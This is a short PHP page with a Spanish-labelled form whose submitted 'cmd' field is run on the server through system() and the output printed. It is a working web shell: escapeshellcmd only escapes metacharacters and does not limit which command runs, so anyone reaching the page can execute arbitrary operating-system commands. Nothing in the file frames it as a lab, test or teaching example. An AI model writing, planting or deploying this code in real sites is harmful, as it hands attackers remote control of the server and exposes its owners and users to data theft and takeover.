<form method="post">
	
<input type="text" name="cmd">
<button type="submit">ENVIAR</button>

</form>


<?php

if ($_SERVER["REQUEST_METHOD"] === "POST"){


	$cmd = escapeshellcmd($_POST["cmd"]);

	var_dump($cmd);
echo "<pre>";
	system($cmd);
echo "</pre>";

}

?>